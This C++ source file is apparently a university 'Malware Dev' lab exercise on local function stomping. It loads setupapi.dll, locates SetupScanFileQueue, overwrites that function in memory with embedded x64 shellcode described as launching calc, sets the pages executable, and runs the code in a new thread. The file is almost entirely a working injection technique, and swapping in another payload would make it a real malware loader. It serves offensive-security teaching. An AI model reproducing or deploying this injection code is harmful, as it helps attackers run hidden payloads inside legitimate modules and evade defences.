/*
* Lab 03 | Malware Dev Fall 2023
* Local Function Stomping
* coremed | willjcim
*/

#include <windows.h>
#include <iostream>


// set our target dll module and function to stomp
#define TARGET_DLL  "setupapi.dll"
#define TARGET_FUNC "SetupScanFileQueue"

// x64 calc shellcode
unsigned char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";


BOOL StompFunction(PVOID pAddr, PBYTE pShellcode, SIZE_T sShellcodeSize) {
	// declare and init dwOldProtection variable
	DWORD dwOldProtection = NULL;

	// set target memory protection to RW
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RW failed with error code: %d\n", GetLastError());
		return FALSE;
	}

	// copy our shellcode to target region
	RtlCopyMemory(pAddr, pShellcode, sShellcodeSize);

	// set target memory protection to RWX 
	if (!VirtualProtect(pAddr, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		// if error return FALSE
		printf("VirtualProtect RWX failed with error code: %d\n", GetLastError());
		return FALSE;
	}
	// function successfully stomped
	return TRUE;
}

int main() {
	// declare some variables
	PVOID   pAddr   = NULL;
	HMODULE hModule = NULL;
	HANDLE  hThread = NULL;

	// prepare to load dll module
	printf("Load module %s?\n", TARGET_DLL);
	system("pause");

	// load dll module
	hModule = LoadLibraryA(TARGET_DLL);
	printf("Module %s loaded\n", TARGET_DLL);
	system("pause");

	// find function addr in memory
	pAddr = GetProcAddress(hModule, TARGET_FUNC);
	printf("Found function %s at 0x%llx\n", TARGET_FUNC, pAddr);
	printf("Stomp function?\n");
	system("pause");

	// stomp function
	if (!StompFunction(pAddr, shellcode, sizeof(shellcode))) {
		return -1;
	}

	printf("Function stomped!\n");
	printf("Execute shellcode?\n");
	system("pause");
	
	// execute our shellcode
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pAddr, 0, 0, 0);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}